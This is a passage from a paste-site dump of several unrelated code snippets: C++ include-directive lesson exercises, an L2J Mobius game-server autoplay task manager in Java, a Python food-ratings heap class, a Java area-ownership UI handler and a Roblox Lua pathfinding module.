    void SetColor(Color color) {
        color_ = color;
    }
    Color GetColor() const {
        return color_;
    }

private:
    double width_;
    double height_;
    Color color_;
};

***************************************************************************************************************************************
main.cpp

#include ""painter.h""

int main() {
    Painter bill;
    Wall wall(3.5, 2.45);

    bill.Paint(wall, Wall::Color::BLUE);
}


"
RYTahVXD,autoplay,BabaYAaga,Java,Thursday 7th of March 2024 01:46:25 PM CDT,"/*
 * This file is part of the L2J Mobius project.
 * 
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 * 
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU
 * General Public License for more details.
 * 
 * You should have received a copy of the GNU General Public License
 * along with this program. If not, see <http://www.gnu.org/licenses/>.
 */
package org.l2jmobius.gameserver.taskmanager;

import java.util.Map;
import java.util.Set;
import java.util.concurrent.ConcurrentHashMap;

import org.l2jmobius.Config;
import org.l2jmobius.commons.threads.ThreadPool;
import org.l2jmobius.gameserver.ai.CtrlIntention;
import org.l2jmobius.gameserver.enums.Race;
import org.l2jmobius.gameserver.geoengine.GeoEngine;
import org.l2jmobius.gameserver.model.Location;
import org.l2jmobius.gameserver.model.Party;
import org.l2jmobius.gameserver.model.World;
import org.l2jmobius.gameserver.model.WorldObject;
import org.l2jmobius.gameserver.model.actor.Creature;
import org.l2jmobius.gameserver.model.actor.Player;
import org.l2jmobius.gameserver.model.actor.Summon;
import org.l2jmobius.gameserver.model.actor.instance.Monster;
import org.l2jmobius.gameserver.model.actor.instance.Pet;
import org.l2jmobius.gameserver.model.item.Weapon;
import org.l2jmobius.gameserver.model.item.instance.Item;
import org.l2jmobius.gameserver.model.skill.Skill;
import org.l2jmobius.gameserver.model.zone.ZoneId;
import org.l2jmobius.gameserver.network.serverpackets.autoplay.ExAutoPlayDoMacro;
import org.l2jmobius.gameserver.util.Util;

/**
 * @author Mobius
 */
public class AutoPlayTaskManager
{
	private static final Set<Set<Player>> POOLS = ConcurrentHashMap.newKeySet();
	private static final Map<Player, Integer> IDLE_COUNT = new ConcurrentHashMap<>();
	private static final int POOL_SIZE = 300;
	private static final int TASK_DELAY = 300;
	private static final Integer AUTO_ATTACK_ACTION = 2;
	private static final Integer PET_ATTACK_ACTION = 16;
	private static final Integer SUMMON_ATTACK_ACTION = 22;
	
	protected AutoPlayTaskManager()
	{
	}
	
	private class AutoPlay implements Runnable
	{
		private final Set<Player> _players;
		
		public AutoPlay(Set<Player> players)
		{
			_players = players;
		}
		
		@Override
		public void run()
		{
			if (_players.isEmpty())
			{
				return;
			}
			
			PLAY: for (Player player : _players)
			{
				if (!player.isOnline() || (player.isInOfflineMode() && !player.isOfflinePlay()) || !Config.ENABLE_AUTO_PLAY)
				{
					stopAutoPlay(player);
					continue PLAY;
				}
				
				if (player.isSitting() || player.isCastingNow() || (player.getQueuedSkill() != null))
				{
					continue PLAY;
				}
				
				// Next target mode.
				final int targetMode = player.getAutoPlaySettings().getNextTargetMode();
				
				// Skip thinking.
				final WorldObject target = player.getTarget();
				if ((target != null) && target.isCreature())
				{
					final Creature creature = (Creature) target;
					if (creature.isAlikeDead() || !isTargetModeValid(targetMode, player, creature))
					{
						// Logic for Spoil (254) skill.
						if (creature.isMonster() && creature.isDead() && player.getAutoUseSettings().getAutoSkills().contains(254))
						{
							final Skill sweeper = player.getKnownSkill(42);
							if (sweeper != null)
							{
								final Monster monster = ((Monster) target);
								if (monster.checkSpoilOwner(player, false))
								{
									// Move to target.
									if (player.calculateDistance2D(target) > 40)
									{
										if (!player.isMoving())
										{
											player.getAI().setIntention(CtrlIntention.AI_INTENTION_MOVE_TO, target);
										}
										continue PLAY;
									}
									
									// Sweep target.
									player.doCast(sweeper);
									continue PLAY;
								}
							}
						}
						
						// Clear target.
						player.setTarget(null);
					}
					else if ((creature.getTarget() == player) || (creature.getTarget() == null))
					{
						// GeoEngine can see target check.
						if (!GeoEngine.getInstance().canSeeTarget(player, creature))
						{
							player.setTarget(null);
							continue PLAY;
						}
						
						// Pet Attack.
						final Pet pet = player.getPet();
						if ((pet != null) && player.getAutoUseSettings().getAutoActions().contains(PET_ATTACK_ACTION) && pet.hasAI() && !pet.isMoving() && !pet.isDisabled() && (pet.getAI().getIntention() != CtrlIntention.AI_INTENTION_ATTACK) && (pet.getAI().getIntention() != CtrlIntention.AI_INTENTION_CAST) && creature.isAutoAttackable(player) && GeoEngine.getInstance().canSeeTarget(player, creature))
						{
							pet.getAI().setIntention(CtrlIntention.AI_INTENTION_ATTACK, creature);
						}
						
						// Summon Attack.
						if (player.hasSummon() && player.getAutoUseSettings().getAutoActions().contains(SUMMON_ATTACK_ACTION))
						{
							for (Summon summon : player.getServitors().values())
							{
								if (summon.hasAI() && !summon.isMoving() && !summon.isDisabled() && (summon.getAI().getIntention() != CtrlIntention.AI_INTENTION_ATTACK) && (summon.getAI().getIntention() != CtrlIntention.AI_INTENTION_CAST) && creature.isAutoAttackable(player) && GeoEngine.getInstance().canSeeTarget(player, creature))
								{
									summon.getAI().setIntention(CtrlIntention.AI_INTENTION_ATTACK, creature);
								}
							}
						}
						
						// We take granted that mage classes do not auto hit.
						if (isMageCaster(player))
						{
							continue PLAY;
						}
						
						// Check if actually attacking.
						if (player.hasAI() && !player.isAttackingNow() && !player.isCastingNow() && !player.isMoving() && !player.isDisabled())
						{
							if (player.getAI().getIntention() != CtrlIntention.AI_INTENTION_ATTACK)
							{
								if (creature.isAutoAttackable(player))
								{
									// GeoEngine can see target check.
									if (!GeoEngine.getInstance().canSeeTarget(player, creature))
									{
										player.setTarget(null);
										continue PLAY;
									}
									
									player.getAI().setIntention(CtrlIntention.AI_INTENTION_ATTACK, creature);
								}
							}
							else if (creature.hasAI() && !creature.getAI().isAutoAttacking())
							{
								final Weapon weapon = player.getActiveWeaponItem();
								if (weapon != null)
								{
									final int idleCount = IDLE_COUNT.getOrDefault(player, 0);
									if (idleCount > 10)
									{
										final boolean ranged = weapon.getItemType().isRanged();
										final double angle = Util.calculateHeadingFrom(player, creature);
										final double radian = Math.toRadians(angle);
										final double course = Math.toRadians(180);
										final double distance = (ranged ? player.getCollisionRadius() : player.getCollisionRadius() + creature.getCollisionRadius()) * 2;
										final int x1 = (int) (Math.cos(Math.PI + radian + course) * distance);
										final int y1 = (int) (Math.sin(Math.PI + radian + course) * distance);
										final Location location;
										if (ranged)
										{
											location = new Location(player.getX() + x1, player.getY() + y1, player.getZ());
										}
										else
										{
											location = new Location(creature.getX() + x1, creature.getY() + y1, player.getZ());
										}
										player.getAI().setIntention(CtrlIntention.AI_INTENTION_MOVE_TO, location);
										IDLE_COUNT.remove(player);
									}
									else
									{
										IDLE_COUNT.put(player, idleCount + 1);
									}
								}
							}
						}
						continue PLAY;
					}
				}
				
				// Reset idle count.
				IDLE_COUNT.remove(player);
				
				// Pickup.
				if (player.getAutoPlaySettings().doPickup())
				{
					PICKUP: for (Item droppedItem : World.getInstance().getVisibleObjectsInRange(player, Item.class, 200))
					{
						// Check if item is reachable.
						if ((droppedItem == null) //
							|| (!droppedItem.isSpawned()) //
							|| !GeoEngine.getInstance().canMoveToTarget(player.getX(), player.getY(), player.getZ(), droppedItem.getX(), droppedItem.getY(), droppedItem.getZ(), player.getInstanceWorld()))
						{
							continue PICKUP;
						}
						
						// Move to item.
						if (player.calculateDistance2D(droppedItem) > 70)
						{
							if (!player.isMoving())
							{
								player.getAI().setIntention(CtrlIntention.AI_INTENTION_MOVE_TO, droppedItem);
							}
							continue PLAY;
						}
						
						// Try to pick it up.
						if (!droppedItem.isProtected() || (droppedItem.getOwnerId() == player.getObjectId()))
						{
							player.doPickupItem(droppedItem);
							continue PLAY; // Avoid pickup being skipped.
						}
					}
				}
				
				// Find target.
				Creature creature = null;
				final Party party = player.getParty();
				final Player leader = party == null ? null : party.getLeader();
				if (Config.ENABLE_AUTO_ASSIST && (party != null) && (leader != null) && (leader != player) && !leader.isDead())
				{
					if (leader.calculateDistance3D(player) < (Config.ALT_PARTY_RANGE * 2 /* 2? */))
					{
						final WorldObject leaderTarget = leader.getTarget();
						if ((leaderTarget != null) && (leaderTarget.isAttackable() || (leaderTarget.isPlayable() && !party.containsPlayer(leaderTarget.getActingPlayer()))))
						{
							creature = (Creature) leaderTarget;
						}
						else if ((player.getAI().getIntention() != CtrlIntention.AI_INTENTION_FOLLOW) && !player.isDisabled())
						{
							player.getAI().setIntention(CtrlIntention.AI_INTENTION_FOLLOW, leader);
						}
					}
				}
				else
				{
					double closestDistance = Double.MAX_VALUE;
					TARGET: for (Creature nearby : World.getInstance().getVisibleObjectsInRange(player, Creature.class, player.getAutoPlaySettings().isShortRange() && (targetMode != 2 /* Characters */) && (targetMode != 4 /* Counterattack */) ? 600 : 1400))
					{
						// Skip unavailable creatures.
						if ((nearby == null) || nearby.isAlikeDead())
						{
							continue TARGET;
						}
						
						// Check creature target.
						if (player.getAutoPlaySettings().isRespectfulHunting() && !nearby.isPlayable() && (nearby.getTarget() != null) && (nearby.getTarget() != player) && !player.getServitors().containsKey(nearby.getTarget().getObjectId()))
						{
							continue TARGET;
						}
						
						// Check next target mode.
						if (!isTargetModeValid(targetMode, player, nearby))
						{
							continue TARGET;
						}
						
						// Check if creature is reachable.
						if ((Math.abs(player.getZ() - nearby.getZ()) < 180) && GeoEngine.getInstance().canSeeTarget(player, nearby) && GeoEngine.getInstance().canMoveToTarget(player.getX(), player.getY(), player.getZ(), nearby.getX(), nearby.getY(), nearby.getZ(), player.getInstanceWorld()))
						{
							final double creatureDistance = player.calculateDistance2D(nearby);
							if (creatureDistance < closestDistance)
							{
								creature = nearby;
								closestDistance = creatureDistance;
							}
						}
					}
				}
				
				// New target was assigned.
				if (creature != null)
				{
					player.setTarget(creature);
					
					// We take granted that mage classes do not auto hit.
					if (isMageCaster(player))
					{
						continue PLAY;
					}
					
					player.sendPacket(ExAutoPlayDoMacro.STATIC_PACKET);
				}
			}
		}
		
		private boolean isMageCaster(Player player)
		{
			// On Essence auto attack is enabled via the Auto Attack action.
			if (Config.AUTO_PLAY_ATTACK_ACTION)
			{
				return !player.getAutoUseSettings().getAutoActions().contains(AUTO_ATTACK_ACTION);
			}
			
			// Non Essence like.
			return player.isMageClass() && (player.getRace() != Race.ORC);
		}
		
		private boolean isTargetModeValid(int mode, Player player, Creature creature)
		{
			switch (mode)
			{
				case 1: // Monster
				{
					return creature.isMonster() && creature.isAutoAttackable(player);
				}
				case 2: // Characters
				{
					return creature.isPlayable() && creature.isAutoAttackable(player);
				}
				case 3: // NPC
				{
					return creature.isNpc() && !creature.isMonster() && !creature.isInsideZone(ZoneId.PEACE);
				}
				case 4: // Counterattack
				{
					return creature.isMonster() || (creature.isPlayer() && ((creature.getTarget() == player) && (creature.getActingPlayer().getEinhasadOverseeingLevel() >= 1)));
				}
				default: // Any Target
				{
					return (creature.isNpc() && !creature.isInsideZone(ZoneId.PEACE)) || (creature.isPlayable() && creature.isAutoAttackable(player));
				}
			}
		}
	}
	
	public synchronized void startAutoPlay(Player player)
	{
		for (Set<Player> pool : POOLS)
		{
			if (pool.contains(player))
			{
				return;
			}
		}
		
		player.setAutoPlaying(true);
		
		for (Set<Player> pool : POOLS)
		{
			if (pool.size() < POOL_SIZE)
			{
				player.onActionRequest();
				pool.add(player);
				return;
			}
		}
		
		final Set<Player> pool = ConcurrentHashMap.newKeySet(POOL_SIZE);
		player.onActionRequest();
		pool.add(player);
		ThreadPool.schedulePriorityTaskAtFixedRate(new AutoPlay(pool), TASK_DELAY, TASK_DELAY);
		POOLS.add(pool);
	}
	
	public void stopAutoPlay(Player player)
	{
		for (Set<Player> pool : POOLS)
		{
			if (pool.remove(player))
			{
				player.setAutoPlaying(false);
				
				// Pets must follow their owner.
				if (player.hasServitors())
				{
					for (Summon summon : player.getServitors().values())
					{
						summon.followOwner();
					}
				}
				if (player.hasPet())
				{
					player.getPet().followOwner();
				}
				IDLE_COUNT.remove(player);
				return;
			}
		}
	}
	
	public static AutoPlayTaskManager getInstance()
	{
		return SingletonHolder.INSTANCE;
	}
	
	private static class SingletonHolder
	{
		protected static final AutoPlayTaskManager INSTANCE = new AutoPlayTaskManager();
	}
}
"
jj3H2akQ,Untitled,smj007,Python,Thursday 7th of March 2024 01:33:10 PM CDT,"class FoodRatings:

    def __init__(self, foods: List[str], cuisines: List[str], ratings: List[int]):
        
        self.foodRating = {}
        self.cuisineRatingFood = defaultdict(list)
        self.cuisineFood = {}
        for food, cuisine, rating in zip(foods, cuisines, ratings):
            self.foodRating[food] = rating
            heapq.heappush(self.cuisineRatingFood[cuisine], [-rating, food])
            self.cuisineFood[food] = cuisine

    def changeRating(self, food: str, newRating: int) -> None:
        self.foodRating[food] = newRating
        cuisine = self.cuisineFood[food]
        heapq.heappush(self.cuisineRatingFood[cuisine], [-newRating, food])

    def highestRated(self, cuisine: str) -> str:
        heap = self.cuisineRatingFood[cuisine]

        while heap:
            top, food = heapq.heappop(heap)
            if -top == self.foodRating[food]:
                return food

        return """"
"
NxFZSP2m,СПРИНТ № 5 | Распределение кода по файлам | Урок 3: Директива #include 1/2,chevengur,C++,Thursday 7th of March 2024 12:59:00 PM CDT,"builder.h

#pragma once
#include ""wall.h""
class Builder {
public:
    double CalcBricksNeeded(const Wall& wall) const {
        double height = wall.GetHeight();
        double width = wall.GetWidth();
        return width * height * 5;
    }
};
***************************************************************************************************************************************
wall.h

#pragma once
class Wall {
public:
    Wall(double width, double height)
        : width_(width)
        , height_(height) {
    }

    double GetHeight() const {
        return height_;
    }
    double GetWidth() const {
        return width_;
    }

private:
    double width_;
    double height_;
};
***************************************************************************************************************************************
main.cpp

#include ""builder.h""
#include <iostream>

int main() {
    Wall wall{3.5, 2.5};
    Builder tom;
    std::cout << tom.CalcBricksNeeded(wall);
}"
GgxDStyN,Untitled,james1bow,Java,Thursday 7th of March 2024 12:54:38 PM CDT,"@EventMethod
    public void enterArea(PlayerEnterAreaEvent evt){
        Player player = evt.getPlayer();
        
        Area area = evt.getArea();
        UILabel Buy_Button = (UILabel)player.getAttribute(""Buy_Button"");
        UILabel Sell_Button = (UILabel)player.getAttribute(""Sell_Button"");
        UILabel Owner_Name_Label=(UILabel)player.getAttribute(""Owner_Name_Label"");
        UILabel Area_Id_Label=(UILabel)player.getAttribute(""Area_Id_Label"");
        String Owner_Name = (String)area.getAttribute(""Owner_Name"");
        long Owner_Id = (Long)area.getAttribute(""Owner_Id"");
        long Area_Id = area.getID();
        Owner_Name_Label.setText(""Owner : ""+Owner_Name);
        Area_Id_Label.setText(""Area Id: ""+String.valueOf(Area_Id));
        Buy_Button.setClickable(false);
        Buy_Button.setVisible(false);
        if(Owner_Id==Long.parseLong(player.getUID())){
            Sell_Button.setVisible(true);
            Sell_Button.setClickable(true);
        }
    }
    
    @EventMethod
    public void leaveArea(PlayerLeaveAreaEvent evt){
        
        Player player = evt.getPlayer();
        Timer timer = new Timer(0f, 0.5f, 1, () -> {
            Timer timera = (Timer)player.getAttribute(""timer"");
            if(hasEnteredAreaCheck(player)==false){
                UILabel Buy_Button = (UILabel)player.getAttribute(""Buy_Button"");
                UILabel Sell_Button = (UILabel)player.getAttribute(""Sell_Button"");
                UILabel Owner_Name_Label=(UILabel)player.getAttribute(""Owner_Name_Label"");
                UILabel Area_Id_Label=(UILabel)player.getAttribute(""Area_Id_Label"");
                String Owner_Name = ""Owner: No Owner"";
                Owner_Name_Label.setText(Owner_Name);
                Area_Id_Label.setText(""Area Id: No Id"");
                Buy_Button.setClickable(true);
                Buy_Button.setVisible(true);
                Sell_Button.setVisible(false);
                Sell_Button.setClickable(false);
                timera.kill();
                player.deleteAttribute(""timer"");
            }else{
                timera.kill();
                player.deleteAttribute(""timer"");
            }
            
        });
        player.setAttribute(""timer"", timer);
        timer.start();
        
        
    }
    
    public Boolean hasEnteredAreaCheck(Player player){
        boolean enteredArea =false;
        Area area = player.getCurrentArea();
        if(area!=null){
            enteredArea=true;
        }if(area==null){
            enteredArea=false;
        }
        return enteredArea;
        
    }"
L7rTSy3H,PathFinder,SimTek,Lua,Thursday 7th of March 2024 12:47:47 PM CDT,"local pathFinder = {}
local pfs = game:GetService(""PathfindingService"")
pathFinder.__index = pathFinder

function pathFinder.new(char)
	local self = setmetatable({}, pathFinder)
	self.character = char
	print(""zombie pf initialized: "", self.character.Name)
	self.hum = char:WaitForChild(""Humanoid"")
	self.hrp = char:WaitForChild(""HumanoidRootPart"")
	self.path = pfs:CreatePath()
	self.waypoints = {}
	self.currentWaypoint = 1
	
	self.connection = self.hum.MoveToFinished:Connect(function(reached)
		if reached and self.currentWaypoint < #self.waypoints then
			self.currentWaypoint += 1
			if self.waypoints[self.currentWaypoint].Action == 
				Enum.PathWaypointAction.Jump then
				self.hum.Jump = true
			end
			self.hum:MoveTo(self.waypoints[self.currentWaypoint].Position)
		else
			self.hum:MoveTo(self.hrp.Position)
			self.connection:Disconnect()
		end
	end)
	return self
end

function pathFinder:followPath(goal)
	self.path:ComputeAsync(self.hrp.Position, goal)
	self.waypoints = {}
	self.currentWaypoint = 1
	if self.path.Status == Enum.PathStatus.Success then
		self.waypoints = self.path:GetWaypoints()
		self.hum:MoveTo(self.waypoints[self.currentWaypoint].Position)
		if self.waypoints[self.currentWaypoint].Action == 
			Enum.PathWaypointAction.Jump then
			self.hum.Jump = true
		end
	else
		print(""ugh, path creation failed!"")
	end
end

function pathFinder:destroy()
	self.waypoints = {}
	self.connection:Disconnect()
end


return pathFinder"
